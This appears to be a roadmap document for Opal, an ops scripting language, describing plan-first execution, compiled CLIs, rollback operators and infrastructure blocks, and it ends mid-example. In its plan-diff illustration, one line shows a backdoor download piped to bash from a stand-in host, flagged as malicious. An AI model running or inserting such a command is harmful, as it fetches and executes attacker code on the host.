---
title: "Future Ideas"
audience: "Project Leads & Contributors"
summary: "Experimental roadmap and potential extensions"
---

# Future Ideas

**Experimental roadmap and potential extensions**

## Category Tags

| Tag | Meaning | Timeline | Risk |
|-----|---------|----------|------|
| 🧪 **Experimental** | Proof of concept stage | Research phase | High - may not work out |
| ⚙️ **Feasible** | Could implement soon | Next 6-12 months | Low - clear path forward |
| 🧭 **Long-term** | Strategic direction | 12+ months | Medium - needs validation |

**How to read this document:**
- 🧪 Ideas are speculative - exploring if they're valuable
- ⚙️ Ideas have clear implementation paths - just need prioritization
- 🧭 Ideas are strategic bets - require significant design work

---

## Tooling Enhancements

### Plan-First Execution Model (🧪 Experimental)

**Core concept**: See exactly what will run before running it.

**REPL modes:**

Execute mode (default):
```bash
opal> deploy("staging")
✓ Executed successfully
```

Plan mode (dry-run):
```bash
opal> plan deploy("staging")
Plan: a3b2c1d4
  1. kubectl apply -f k8s/staging/
  2. kubectl scale --replicas=3 deployment/app
  
Execute? [y/N]
```

**Safe remote code:**

```bash
opal> import "https://example.com/deploy.opl"
opal> plan setup()

Plan: a3b2c1d4
  1. @shell("apt-get update")
  2. @shell("apt-get install -y docker.io")
  3. @file.write("/etc/docker/daemon.json", ...)
  
⚠️  This plan will:
  - Install packages: docker.io
  - Modify system file: /etc/docker/daemon.json
  
Execute? [y/N]
```

**Hash-based trust:**

Plans have deterministic hashes:
- Community can vouch for plan hashes
- Verify you're running the same plan others reviewed
- Differential analysis on updates

```bash
opal> import "https://example.com/script.opl" --update
⚠️  New version detected

opal> diff old-plan new-plan
+ Added: @shell("curl evil.com/backdoor.sh | bash")  # 🚨
```

---

## Tooling Enhancements

### Interactive REPL (⚙️ Feasible)

**Full example with interactive mode:**

```bash
$ opal
opal> fun deploy(env: String) {
...     @shell("kubectl apply -f k8s/@var.env/")
...   }
Function 'deploy' defined

opal> deploy("staging")
✓ Executed successfully

opal> @env.USER
"adavies"
```

Features:
- Command history and completion
- Function definitions
- Decorator integration
- Plan mode built-in

### System Shell (🧭 Long-term)

Could Opal be a daily-driver shell?

**What's needed:**
- REPL infrastructure
- Built-in commands (cd, pwd, exit)
- Environment variables
- I/O redirection
- Job control

**Approach:** Start with REPL, see how it feels, then decide.

### LSP/IDE Integration (⚙️ Feasible)

Real-time tooling:
- Syntax checking as you type
- Autocomplete
- Jump to definition
- Hover documentation
- Rename refactoring

### Standalone Binary Generation (⚙️ Feasible)

**Core concept**: Compile Opal scripts into standalone CLI binaries with built-in plan-first execution.

**Command file as CLI:**
```opal
# commands.opl - becomes a CLI tool
build: {
    npm install
    npm run build
}

test: {
    npm test
}

deploy: {
    when @var.ENV {
        "production" -> {
            kubectl apply -f k8s/prod/
            kubectl rollout status deployment/app
        }
        "staging" -> kubectl apply -f k8s/staging/
    }
}
```

**Compile to binary:**
```bash
# Generate standalone CLI
opal compile commands.opl -o myapp

# Use the generated binary
./myapp --help
# Commands:
#   build   - Build the application
#   test    - Run tests
#   deploy  - Deploy to environment

# All commands support --dry-run
./myapp deploy --dry-run
# Plan: 5f6c...
#   1. kubectl apply -f k8s/prod/
#   2. kubectl rollout status deployment/app

./myapp deploy
# ✓ Executed successfully
```

**Benefits:**
- **Zero dependencies**: Ship single binary, no Opal installation required
- **Air-gapped deployment**: Works in isolated/restricted environments
- **Plan-first everywhere**: Every command supports `--dry-run` automatically
- **Contract verification**: Built-in plan verification on execution
- **Security auditable**: Embedded source visible via `--show-source`
- **Fast startup**: Sub-millisecond parse overhead (imperceptible)

**Implementation approach:**
- Embed source + full runtime (lexer/parser/executor)
- Parse embedded source at startup (~0.5ms overhead)
- Binary size: ~2-3MB (acceptable for portability)
- Same code path as interpreter (simpler, more reliable)
- Source available for security review and debugging

**Security and auditability:**
```bash
# Extract source for security review
./ops-cli --show-source > audit.opl

# Verify plan before execution
./ops-cli deploy --dry-run --resolve > plan.txt
# Security team reviews plan.txt
# Approves plan hash: 5f6c...

# Execute with contract verification
./ops-cli deploy --plan plan.txt
# Replans from current state, verifies hash matches, then executes
```

**Air-gapped deployment:**
```bash
# On internet-connected machine:
opal compile deploy.opl -o deploy
sha256sum deploy > deploy.sha256

# Transfer to air-gapped system:
scp deploy deploy.sha256 air-gapped:/opt/ops/

# On air-gapped system (no Opal, no Go, nothing):
sha256sum -c deploy.sha256  # Verify integrity
./deploy --dry-run          # Review plan
./deploy                    # Execute
```

**Advanced features:**
```bash
# Custom CLI metadata
opal compile commands.opl \
    --name "myapp" \
    --version "1.2.3" \
    --author "team@example.com" \
    -o dist/myapp

# Cross-compile for multiple platforms
opal compile commands.opl \
    --targets linux-amd64,darwin-arm64,windows-amd64 \
    -o dist/

# Embed resources (configs, templates)
opal compile commands.opl \
    --embed k8s/ \
    --embed configs/ \
    -o myapp
```

**Use cases:**
- **Air-gapped environments**: No package managers, no internet, just copy binary
- **Customer distribution**: Ship ops tools without "install Opal first"
- **Locked-down systems**: Can't install runtimes, but can run approved binaries
- **Compliance environments**: Auditable binaries with embedded source
- **CI/CD**: Compile once, use everywhere in pipeline
- **Project CLIs**: Per-project task runners committed to repo
- **Embedded/edge deployment**: Minimal systems, IoT devices

**Example: Project CLI**
```opal
# Makefile.opl - project task runner
setup: {
    echo "Setting up development environment..."
    @retry(attempts=3) {
        npm install
        docker-compose up -d postgres
    }
}

dev: {
    @parallel {
        npm run dev
        docker-compose logs -f postgres
    }
}

test: {
    @timeout(duration=5m) {
        npm run test:unit
        npm run test:integration
    }
}

deploy: {
    var ENV = @env.ENVIRONMENT
    echo "Deploying to @var.ENV..."
    
    when @var.ENV {
        "production" -> {
            # Production requires plan review
            echo "⚠️  Production deployment - review plan first"
            echo "Run: ./dev deploy --dry-run --resolve > prod.plan"
        }
        else -> {
            kubectl apply -f k8s/@var.ENV/
        }
    }
}
```

**Compile and distribute:**
```bash
# Compile project CLI
opal compile Makefile.opl -o dev

# Commit to repo
git add dev
git commit -m "Add compiled dev CLI"

# New developer clones repo
git clone repo
./dev setup --dry-run  # See what will happen
./dev setup            # Run setup
./dev dev              # Start development
```

**Implementation approach:**
- Embed Opal runtime in binary
- Pre-parse and validate at compile time
- Include all decorators used in script
- Generate CLI parser from command definitions
- Support all standard flags (`--dry-run`, `--resolve`, `--plan`)

**Why this works:**
- Plan-first model already separates planning from execution
- Event-based parser enables ahead-of-time compilation
- Decorator registry allows selective embedding
- Deterministic execution ensures compiled behavior matches interpreted

---

## Language Evolution

### Runtime Values with `let` and `@out` (⚙️ Feasible)

**Goal:** Pass runtime resource identifiers (VPC IDs, instance IPs, job refs) between execution steps without breaking plan-time determinism.

**The Problem:**
```opal
// VPC ID doesn't exist at plan-time
@aws.vpc.create(cidr="10.0.0.0/16", name="prod-vpc")

// How do we pass the VPC ID to the next step?
@aws.subnet.create(
  vpc=???,  // Need the VPC ID from previous step
  cidr="10.0.1.0/24"
)
```

**The Solution: `let` for Runtime Values**

```opal
// let binds execution results (runtime values)
let vpc = @aws.vpc.create(cidr="10.0.0.0/16", name="prod-vpc")
let subnet = @aws.subnet.create(vpc=@out.vpc.id, cidr="10.0.1.0/24")
let instance = @aws.instance.create(subnet=@out.subnet.id, type="t3.medium")

// Access runtime values with @out
echo "Instance IP: @out.instance.ip"
@aws.instance.ssh(instance=@out.instance) {
  apt-get update
}
```

**Core Distinction:**
- **`var`** = plan-time values (resolved during planning, concrete in plans)
- **`let`** = runtime values (resolved during execution, placeholders in plans)

**Syntax (conceptual):**
```ebnf
let_stmt  = "let" identifier "=" execution_decorator ;
out_ref   = "@out." identifier ("." property)* ;
```

**Critical Constraints:**

1. **`let` only binds execution decorators:**
   ```opal
   let vpc = @aws.vpc.create(...)        # ✅ Execution decorator
   let port = @env.PORT                  # ❌ Value decorator (use var)
   let name = "prod"                     # ❌ Literal (use var)
   ```

2. **Block-scoped, cannot escape to parent:**
   ```opal
   {
     let vpc = @aws.vpc.create(...)
     echo "VPC: @out.vpc.id"             # ✅ Visible in same block
   }
   echo "VPC: @out.vpc.id"               # ❌ Not visible in parent
   ```

3. **Can be passed (copied) to child blocks:**
   ```opal
   let vpc = @aws.vpc.create(...)
   {
     // vpc is visible in child block
     let subnet = @aws.subnet.create(vpc=@out.vpc.id, ...)
   }
   ```

4. **Cannot be used in metaprogramming constructs:**
   ```opal
   let count = @aws.instance.count()
   
   for i in @out.count {                 # ❌ Cannot use in for loop
     echo "Item @var.i"
   }
   
   when @out.vpc.region {                # ❌ Cannot use in when
     "us-east-1" -> { ... }
   }
   
   if @out.instance.ready {              # ❌ Cannot use in if
     echo "Ready"
   }
   ```

5. **Shadowing works like `var`:**
   ```opal
   let web = @aws.instance.create(name="web-prod")
   {
     let web = @aws.instance.create(name="web-canary")
     echo "@out.web.ip"                  # Refers to canary
   }
   echo "@out.web.ip"                    # Refers to prod
   ```

**Plan Representation:**

Plans show placeholders for runtime values:

```
Plan (deterministic structure):
  1. let vpc = @aws.vpc.create(cidr="10.0.0.0/16")
     → <handle:vpc>
  2. let subnet = @aws.subnet.create(vpc=<handle:vpc>.id, cidr="10.0.1.0/24")
     → <handle:subnet>
  3. echo "Subnet: <handle:subnet>.id"
```

**Why This Works:**

1. **Preserves plan-time determinism** - Plans show structure, not concrete IDs
2. **Clear mental model** - `var` = plan-time, `let` = runtime
3. **Value decorators stay pure** - No execution-time resolution for `@var.NAME`
4. **Solves real operational need** - Pass VPC IDs, instance IPs, job refs between steps

**When to Use:**
- Creating cloud resources (VPCs, instances, databases) and passing IDs
- Capturing job IDs, signed URLs, ephemeral tokens
- Any execution result needed in subsequent steps

**When NOT to Use:**
- Plan-time values (use `var` with value decorators)
- Metaprogramming (use `var` for loop ranges, conditionals)
- Configuration (use `var` for settings, flags, paths)

---

### Execution Control Operators: `ensure` and `rollback` (⚙️ Feasible)

**Goal:** Automatic rollback on failure for deployments, migrations, and multi-step workflows (day-2 operations safety).

**The Problem:**

```opal
// Deploy new version
kubectl apply -f k8s/app-v2.yaml
kubectl rollout status deployment/app

// Check health
curl -fsS http://app/health

// If health check fails... manual rollback needed
// kubectl rollout undo deployment/app
```

**The Solution: Execution Control Operators**

Work happens first, then operators chain verification and rollback logic:

```opal
kubectl apply -f k8s/app-v2.yaml
kubectl rollout status deployment/app
  |> ensure { curl -fsS http://app/health }
  |> rollback { kubectl rollout undo }
```

**Reads as:** "Do work, ensure this check passes, rollback if it fails"

**Semantics (Chain Execution):**

Each operator in the chain responds to the result of what came before it:

1. **Work executes** (before any operators)
2. **`|> ensure { check }`** - runs if work succeeded
   - If check passes → continue chain
   - If check fails → continue to next operator (typically `rollback` or `catch`)
3. **`|> rollback { ... }`** - runs if anything before it failed
   - Catches work failures OR ensure failures
   - Executes compensation logic
   - **Error still propagates** (rollback doesn't recover)
4. **`|> catch { ... }`** - runs if anything before it failed
   - Handles the failure
   - **Recovers and continues** (error does not propagate)
5. **`|> finally { ... }`** - always runs
   - Executes regardless of success or failure
   - Used for cleanup (temp files, locks, notifications)

**Standalone operator behavior:**

```opal
// Just work - errors if fails
kubectl apply -f k8s/app-v2.yaml

// Work + rollback - rollback runs if work fails, error propagates
kubectl apply -f k8s/app-v2.yaml
  |> rollback { kubectl rollout undo }

// Work + ensure - check runs if work succeeds, errors if check fails
kubectl apply -f k8s/app-v2.yaml
  |> ensure { curl -fsS http://app/health }

// Work + ensure + rollback - rollback runs if ensure fails, error propagates
kubectl apply -f k8s/app-v2.yaml
  |> ensure { curl -fsS http://app/health }
  |> rollback { kubectl rollout undo }

// Work + ensure + catch - catch runs if ensure fails, recovers and continues
kubectl apply -f k8s/app-v2.yaml
  |> ensure { curl -fsS http://app/health }
  |> catch { 
    kubectl rollout undo
    echo "Rolled back, continuing..."
  }

// Work + finally - cleanup always runs
kubectl apply -f k8s/app-v2.yaml
  |> finally { rm -f /tmp/deploy.lock }
```

**Key distinction:**
- **`rollback`** - compensate for failure (error still propagates, script stops)
- **`catch`** - handle failure and recover (error absorbed, script continues)

**Each operator makes sense standalone and composes naturally in chains.**

**Why Operators, Not Special Syntax:**

- **Consistent with existing operators** - Opal already has `|`, `&&`, `||`, `;`
- **Composable** - Can chain multiple operators together
- **Natural left-to-right flow** - Work → verify → compensate
- **Each operator makes sense standalone** - Can use `|> ensure` without `|> rollback`
- **Extensible** - Easy to add new operators in the future

**Operator Precedence:**

```
|  (pipe)           - data flow (highest)
|> (ensure/rollback) - execution control
&& ||              - conditional execution
;                  - sequence
newline            - fail-fast sequence (lowest)
```

**With Retry Parameters:**

Optional parameters apply to the check only (not the work):

```opal
kubectl apply -f k8s/app-v2.yaml
  |> ensure(attempts=3, delay=5s, timeout=30s) { curl -fsS http://app/health }
  |> rollback { kubectl rollout undo }
```

**LIFO Unwind for Multi-Step Workflows:**

**Core mechanism:** `|> rollback` registers a compensator on a per-scope stack. Any unrecovered failure triggers a stack unroll (LIFO).

**Registration rules:**
1. Each scope maintains a `CompStack` (compensation stack)
2. After a frame **succeeds** (work ok + all `ensure` ok), every attached `rollback` is **pushed** to `CompStack`
3. On failure: run local handlers, then **unwind `CompStack` LIFO**
4. Recovery: any `catch` may absorb the error; if recovered, **do not unwind** outer stack

**Example:**

```opal
// Frame 1: Database migration
psql -f migrations/003-add-users.sql
  |> ensure { psql -c "SELECT COUNT(*) FROM users;" }
  |> rollback { psql -f migrations/003-rollback.sql }
// Success: rollback registered on CompStack

// Frame 2: Deploy app v2
kubectl apply -f k8s/app-v2.yaml
kubectl rollout status deployment/app
  |> ensure { curl -fsS http://app/health }
  |> rollback { kubectl rollout undo }
// Success: rollback registered on CompStack

// Frame 3: Route traffic to v2
@lb.route_to("app-v2")
sleep 5
  |> ensure { curl -fsS http://lb/health }
  |> rollback { @lb.route_to("app-v1") }
// Failure: ensure fails

// Execution on Frame 3 failure:
// 1. Run Frame 3 rollback: @lb.route_to("app-v1")
// 2. UNWIND CompStack (LIFO):
//    - Pop and run Frame 2 rollback: kubectl rollout undo
//    - Pop and run Frame 1 rollback: psql -f migrations/003-rollback.sql
// 3. Propagate error (script exits with failure)
```

**Key insight:** LIFO emerges naturally from the stack. Rollbacks are registered on success, unwound on failure.

**Using `catch` to recover and continue:**

```opal
// Try deploying v2, fall back to v1 if it fails, continue either way
kubectl apply -f k8s/app-v2.yaml
  |> ensure { curl -fsS http://app/health }
  |> catch { 
    kubectl rollout undo
    echo "Rolled back to v1"
  }

// This still runs because catch recovered
echo "Deployment complete"
```

**Combining operators:**

```opal
kubectl apply -f k8s/app-v2.yaml
  |> ensure { curl -fsS http://app/health }
  |> rollback { kubectl rollout undo }
  |> catch { echo "Handled deployment failure" }
  |> finally { rm -f /tmp/deploy.lock }

// Execution on ensure failure:
// 1. ensure fails
// 2. rollback runs (compensate)
// 3. catch runs (recover)
// 4. finally runs (cleanup)
// 5. Continue (success, because catch recovered)
```

**Integration with `let`/`@out`:**

Checks and rollbacks can reference runtime values:

```opal
let instance = @aws.instance.create(type="t3.medium")

@aws.instance.ssh(instance=@out.instance) {
  docker run -d --name app myapp:v2
}
  |> ensure { curl -fsS http://@out.instance.ip/health }
  |> rollback {
    @aws.instance.ssh(instance=@out.instance) {
      docker rm -f app
    }
  }
```

**Plan Representation:**

Plans show all possible paths (execution control flow):

```
Plan (deterministic structure):
  1. kubectl apply -f k8s/app-v2.yaml
  2. kubectl rollout status deployment/app
  3. |> ensure frame pushed
  4. check: curl -fsS http://app/health
  5a. [success path] frame popped, continue
  5b. [failure path] execute rollback: kubectl rollout undo
```

**Why This Works:**

1. **Operators, not special syntax** - Extends Opal's existing operator model
2. **Composable** - Works with other operators (`&&`, `||`, `|`)
3. **Natural reading** - Left-to-right flow matches execution order
4. **Automatic LIFO** - Runtime manages rollback stack
5. **Day-2 ops focus** - Solves real deployment safety problems

**Use Cases:**
- Application deployments with health checks
- Database migrations with schema validation
- Multi-step workflows (deploy → verify → route traffic)
- Any operation where failure requires cleanup

**Runtime Execution Model:**

```
For each frame F:
  1. Run work
  2. If work fails:
     - Run catch handlers (if any); if recovered → goto DONE
     - Run rollback handlers; UNWIND(); propagate error
  3. If work succeeds:
     - Run ensure handlers
     - If any ensure fails:
       - Run rollback handlers; UNWIND(); propagate error
     - If all ensure pass:
       - Push all rollback handlers onto CompStack (registration)
  4. DONE: Run finally handlers

UNWIND():
  While CompStack not empty:
    Pop and run compensator (LIFO)
```

**Determinism:** The plan records all possible paths (work, ensure, rollback, catch, finally, unwind steps). Runtime only chooses which path to take. This preserves contract verification.

**Note:** Some details are still being refined (e.g., exact error propagation rules, parallel branch aggregation). The core concept is solid: operators chain with `|>`, rollbacks register on success and unwind LIFO on failure.

**Relationship to `try/catch/finally`:**

If execution control operators are implemented, traditional `try/catch/finally` block syntax would likely be removed in favor of the operator model. The operators provide the same functionality with better composability:

```opal
// Traditional try/catch (would be removed)
try {
  kubectl apply -f k8s/app-v2.yaml
} catch {
  kubectl rollout undo
} finally {
  echo "Done"
}

// Operator equivalent (preferred)
kubectl apply -f k8s/app-v2.yaml
  |> catch { kubectl rollout undo }
  |> finally { echo "Done" }
```

The operator model is more flexible (can add `ensure` for verification) and consistent with Opal's existing operator system (`|`, `&&`, `||`).

---

### Plan Verification (⚙️ Feasible)

**Audit trail:** (See [SPECIFICATION.md](SPECIFICATION.md#contract-verification) for current contract model)
- Every plan has a hash
- Track what was planned vs executed
- Compliance reporting

**CI/CD workflow:**
```bash
# Generate plan for review
opal plan deploy("prod") > plan.txt

# Human reviews

# Execute exact plan
opal execute plan.txt
```

**Differential analysis:**
```bash
opal> diff plan-v1 plan-v2
  1. kubectl apply -f k8s/staging/
  1. kubectl apply -f k8s/prod/        # Different path
```

---

## Ecosystem Extensions

### Terraform/Pulumi Provider Bridge (⚙️ Feasible)

**Strategy:** Keep **dedicated providers** for core operations (K8s, shell, HTTP, secrets), add **bridge** for instant ecosystem reach.

**Why this is feasible:**
- **Terraform/OpenTofu expose machine-readable schemas** via `terraform providers schema -json` / `tofu providers schema -json`
- **Provider protocol is documented and stable (gRPC)** - can drive providers headlessly
- **Pulumi proves the pattern** at scale with their TF bridge and package schemas
- **Schema contains everything needed** for codegen: types, resources, data sources, docs

#### Schema Import & Codegen

**1. Import OpenTofu/Terraform schema:**
```bash
# Export provider schema
tofu providers schema -json > aws-schema.json

# Import into Opal
opal provider add hashicorp/aws
# Reads schema, generates decorators + plugin manifest
```

**2. Type mapping (TF → Opal):**
```
TF Type          → Opal Type
─────────────────────────────
string           → String
number           → Number
bool             → Bool
list(T)          → List<T>
map(T)           → Map<String, T>
object({...})    → Struct
set(T)           → Set<T>
```

**3. Generated decorators:**

**Data sources → Value decorators:**
```opal
# From aws_ami data source
var ami = @aws.ami.lookup(
    filters={
        name="ubuntu/images/hvm-ssd/ubuntu-*",
        architecture="x86_64"
    },
    owners=["099720109477"]
)

echo "AMI ID: @var.ami.id"
echo "Name: @var.ami.name"
```

**Resources → Execution decorators:**
```opal
# From aws_s3_bucket resource
@aws.s3.bucket.ensure(
    name="my-app-bucket",
    region="us-east-1",
    versioning=true,
    tags={env: "prod", team: "platform"}
)
```

#### Runtime Adapter (Stateless UX, Stateful Engine)

**Per-call scratch workspace approach:**
```
1. User calls @aws.s3.bucket.ensure(...)
2. Opal creates temp workspace
3. Calls provider via gRPC (plan + apply)
4. Extracts result, cleans up workspace
5. Returns to Opal execution flow
```

**Plan integration:**
```
Opal Plan Entry:
  Step 3: @aws.s3.bucket.ensure(name="my-app", ...)
    Provider Plan (embedded):
      + aws_s3_bucket.bucket
          name:       "my-app"
          region:     "us-east-1"
          versioning: true
    Plan Hash: sha256:a1b2c3...
```

**Key insight:** TF manages drift via state file; Opal queries reality each run. Bridge treats TF plan/apply as **internal mechanism** while preserving Opal's plan-first + stateless UX.

#### Plugin Manifest → IDE Experience

**Generated manifest (per provider):**
```json
{
  "provider": "aws",
  "version": "5.0.0",
  "decorators": {
    "aws.ami.lookup": {
      "kind": "value",
      "returns": "Ami",
      "params": {
        "filters": {"type": "Map<String, String>", "required": false},
        "owners": {"type": "List<String>", "required": false}
      },
      "docs": "Look up an AMI by filters..."
    },
    "aws.s3.bucket.ensure": {
      "kind": "execution",
      "returns": "ExitStatus",
      "params": {
        "name": {"type": "String", "required": true},
        "region": {"type": "String", "required": false},
        "versioning": {"type": "Bool", "required": false}
      },
      "docs": "Create or update S3 bucket..."
    }
  }
}
```

**LSP uses manifest for:**
- `@` + `.` completions (namespace → decorator)
- `(` signature help (parameter types, required/optional)
- Hover docs (pulled from provider schema)
- Type checking (catch errors before execution)

#### Guardrails & Safety

**1. Plan safety summary:**
```
Plan for @aws.s3.bucket.ensure:
  CREATE: aws_s3_bucket.bucket
    ⚠️  This will create a new S3 bucket
    📝 Estimated cost: $0.023/month (standard storage)
    🔒 Public access: blocked (default)
```

**2. Dry-run enforcement (policy):**
```bash
# Require plan review for prod
opal deploy --env=prod
# Error: Production requires --plan flag with approved hash

# Workflow:
opal plan deploy --env=prod > plan.txt
# Security reviews plan.txt, approves hash: sha256:5f6c...

opal deploy --env=prod --plan plan.txt
# Replans, verifies hash matches, executes
```

**3. Idempotence knobs (Opal advantage):**
```opal
# Opal's idempotence on top of TF providers
@aws.s3.bucket.ensure(
    name="my-app-bucket",
    idempotenceKey=["name"],
    onMismatch="ignore"  # Use existing if found
)
```

#### Implementation Roadmap

**Phase 1: Proof of Concept (2-4 weeks)**
- Schema import for AWS provider
- Generate 2 value decorators (data sources)
- Generate 2 execution decorators (resources)
- Basic gRPC adapter (scratch workspace)
- Manual testing

**Phase 2: MVP (6-8 weeks)**
- Full AWS provider coverage
- Plugin manifest generation
- LSP integration (completions, signature help)
- Plan integration (embed TF plan in Opal plan)
- Automated tests

**Phase 3: Production Ready (3-4 months)**
- Kubernetes provider
- Error handling & recovery
- Performance optimization (workspace pooling)
- Documentation & examples
- Security audit

**Phase 4: Ecosystem (6+ months)**
- Support for all major providers (GCP, Azure, etc.)
- Provider registry & versioning
- Community contributions
- Enterprise features (private registries)

#### First Targets

**AWS provider** - Proves both value and exec sides, huge surface, great docs
**Kubernetes provider** - Mixed shell + provider flows, critical for ops

#### Why This Beats Pure TF/Pulumi

**vs Terraform:**
- ✅ Procedural flows (not declarative graph)
- ✅ First-class retry/timeout/error handling
- ✅ Mix shell commands naturally
- ✅ Stateless execution (query reality each run)

**vs Pulumi:**
- ✅ Compact ops DSL (not full programming language)
- ✅ Plan-first everywhere (not optional)
- ✅ Standalone binaries (no runtime dependency)
- ✅ Contract verification (hash-based)

**vs Shell scripts:**
- ✅ Type safety from provider schemas
- ✅ IDE support (completions, docs)
- ✅ Structured error handling
- ✅ Auditable plans

**Net result:** Pulumi-level typing & IDE + Terraform provider breadth + better ergonomics than shell.

### Infrastructure as Code (IaC) (🧭 Long-term)

**Philosophy**: Outcome-focused, not describe-the-world. Ensure resources matching criteria exist, then use them in your script.

**Key difference from Terraform/Pulumi**: Opal doesn't describe desired state - it ensures outcomes and performs work with those resources.

**Block semantics**: In Opal, blocks are deterministic execution scopes — not configuration definitions. For `@aws.instance.deploy`, the block executes once *inside* the created instance, immediately after successful creation, and never again unless the instance is recreated. This is not Terraform with decorators — it's contextual execution.

### Deploy Block (Runs on First Creation Only)

```opal
# Deploy block: runs once, inside the instance, immediately after first creation.
# Not a persistent resource block — it's an execution context scoped to creation.
var webServer = @aws.instance.deploy(
    name="web-server",
    type="t3.medium",
    ami="ubuntu-22.04"
) {
    # Executes INSIDE the instance, ONLY on first creation
    apt-get update
    apt-get install -y nginx docker.io
    systemctl enable nginx
    echo "Server initialized on $(date)" > /var/log/init.log
}

# First run: Creates instance, runs block inside it
# Second run: Instance exists, block skipped (already provisioned)
```

### SSH Block (Runs Always)

```opal
# SSH block: execution context that runs every time, inside the instance.
# This is operational work, not resource configuration.
@aws.instance.ssh(instance=@var.webServer) {
    # Executes INSIDE the instance, EVERY time the script runs
    systemctl restart nginx
    docker pull myapp:latest
    docker run -d -p 80:3000 myapp:latest
}

# First run: Runs after deploy block (instance just created)
# Second run: Runs immediately (instance already exists)
# Every run: Same operational work, fresh execution
```

### Complete Example: Outcome-Focused Deployment

```opal
deploy_app: {
    # Ensure database exists, initialize on first creation
    var db = @aws.rds.deploy(
        name="app-db",
        engine="postgres",
        instanceClass="db.t3.micro"
    ) {
        # Runs ONLY on first creation
        psql -c "CREATE DATABASE app;"
        psql -c "CREATE USER app WITH PASSWORD 'secret';"
        psql app -f schema.sql
    }
    
    # Ensure web server exists, provision on first creation
    var web = @aws.instance.deploy(
        name="web-server",
        type="t3.medium"
    ) {
        # Runs ONLY on first creation
        apt-get update
        apt-get install -y nginx
        systemctl enable nginx
    }
    
    # Always run migrations (every execution)
    @aws.rds.psql(instance=@var.db) {
        psql app -f migrations/001-add-users.sql
        psql app -f migrations/002-add-indexes.sql
    }
    
    # Always deploy latest app (every execution)
    @aws.instance.ssh(instance=@var.web) {
        docker pull myapp:@var.VERSION
        docker stop myapp || true
        docker run -d --name myapp -p 80:3000 \
            -e DATABASE_URL=@var.db.endpoint \
            myapp:@var.VERSION
    }
    
    echo "Deployed version @var.VERSION to @var.web.publicIp"
}
```

**What happens:**

**First run:**
1. `@aws.rds.deploy()` - Creates database, runs initialization block
2. `@aws.instance.deploy()` - Creates instance, runs provisioning block
3. `@aws.rds.psql()` - Runs migrations
4. `@aws.instance.ssh()` - Deploys app

**Second run (same script):**
1. `@aws.rds.deploy()` - Database exists, **skips block**
2. `@aws.instance.deploy()` - Instance exists, **skips block**
3. `@aws.rds.psql()` - **Runs migrations** (idempotent)
4. `@aws.instance.ssh()` - **Deploys app** (always runs)

### Flexible Idempotence Matching

**Key insight**: Let users decide which attributes matter for "is this the same resource?"

**Traditional IaC**: All fields must match exactly (purist approach)
- Instance type changed? → DRIFT! Must fix!
- Storage size different? → OUT OF SYNC! Must reconcile!

**Opal approach**: Pragmatic matching based on operational needs

```opal
# Option 1: Name-only matching (most pragmatic)
var web = @aws.instance.deploy(
    name="web-server",
    type="t3.medium",
    ami="ubuntu-22.04",
    
    # Only name determines "is this the same instance?"
    idempotenceKey=["name"]
) {
    apt-get install -y nginx
}

# Matching logic:
# - Found instance with name="web-server"? → Use it
#   - Type is t3.large instead of t3.medium? Don't care, use it
#   - AMI is different? Don't care, use it
#   - Someone manually changed it? Don't care, use it
# - Not found? → Create with specified params
```

```opal
# Option 2: Semantic matching (match what matters)
var db = @aws.rds.deploy(
    name="app-db",
    engine="postgres",
    version="14",
    storage=100,
    
    # Engine version matters, storage doesn't
    idempotenceKey=["name", "engine", "version"]
)

# Matching:
# - name="app-db", engine="postgres", version="14", storage=200? → Use it (storage differs, OK)
# - name="app-db", engine="postgres", version="15"? → Different resource (version matters)
# - name="app-db", engine="mysql"? → Different resource (engine matters)
```

```opal
# Option 3: Strict matching (purist, like traditional IaC)
var web = @aws.instance.deploy(
    name="prod-web",
    type="t3.medium",
    ami="ubuntu-22.04",
    
    # All fields must match exactly
    idempotenceKey=["name", "type", "ami"],
    onMismatch="error"  # Fail if anything differs
)

# Found instance with different type? → ERROR: Instance type mismatch
```

**Default behaviors per resource type:**

```opal
# AWS instances: default to name-only (pragmatic)
@aws.instance.deploy(name="web")
# Implicitly: idempotenceKey=["name"]

# Databases: default to name + engine (semantic)
@aws.rds.deploy(name="db", engine="postgres")
# Implicitly: idempotenceKey=["name", "engine"]

# Override when needed
@aws.instance.deploy(
    name="web",
    type="t3.medium",
    idempotenceKey=["name", "type"]  # Must match both
)
```

**Mismatch handling options:**

```opal
# Warn but use it anyway (default)
var web = @aws.instance.deploy(
    name="web",
    type="t3.medium",
    idempotenceKey=["name", "type"],
    onMismatch="warn"
)
# Found t3.large → WARNING: Expected t3.medium, found t3.large. Using anyway.

# Fail on mismatch (strict)
var web = @aws.instance.deploy(
    name="web",
    type="t3.medium",
    idempotenceKey=["name", "type"],
    onMismatch="error"
)
# Found t3.large → ERROR: Instance type mismatch

# Ignore differences silently (fully pragmatic)
var web = @aws.instance.deploy(
    name="web",
    type="t3.medium",
    idempotenceKey=["name"],
    onMismatch="ignore"
)
# Found t3.large → Uses it, no warnings

# Create new if mismatch
var web = @aws.instance.deploy(
    name="web",
    type="t3.medium",
    idempotenceKey=["name", "type"],
    onMismatch="create"
)
# Found t3.large → Creates "web-2" with t3.medium
```

**Choose your level of pragmatism based on environment:**

```opal
# Ephemeral PR environments: fully pragmatic
var web = @aws.instance.deploy(
    name="pr-@var.PR",
    idempotenceKey=["name"]  # Any instance with this name is fine
)

# Staging: semantic matching
var db = @aws.rds.deploy(
    name="staging-db",
    engine="postgres",
    idempotenceKey=["name", "engine"]  # Engine matters, size doesn't
)

# Production: strict matching
var db = @aws.rds.deploy(
    name="prod-db",
    engine="postgres",
    version="14",
    instanceClass="db.r5.xlarge",
    idempotenceKey=["name", "engine", "version", "instanceClass"],
    onMismatch="error"  # Everything must match exactly
)
```

### Contrast with Traditional IaC

```hcl
# Terraform: Purist - everything must match exactly
resource "aws_instance" "web" {
  ami           = "ami-abc123"
  instance_type = "t3.medium"
}
# Someone changed to t3.large? → DRIFT! Must fix!
# Separate provisioning from deployment
```

```opal
# Opal: Pragmatic - match what matters, use immediately
var web = @aws.instance.deploy(
    name="web-server",
    type="t3.medium",
    idempotenceKey=["name"]  # Only name matters
) {
    apt-get install -y nginx  # First creation only
}

@aws.instance.ssh(instance=@var.web) {
    systemctl restart nginx   # Every run
}
# Found t3.large instead? Fine, use it. Work gets done.
```

### Why This Matters: Ops-Focused Infrastructure + Playbooks

**The exciting part**: Combines infrastructure deployment with playbook-style execution in one tool.

**Perfect for ephemeral environments:**
```opal
# Spin up test environment, run tests, tear down
test_pr: {
    # Create test database
    var db = @aws.rds.deploy(name="test-pr-@var.PR_NUMBER") {
        psql -c "CREATE DATABASE test;"
        psql test -f schema.sql
    }
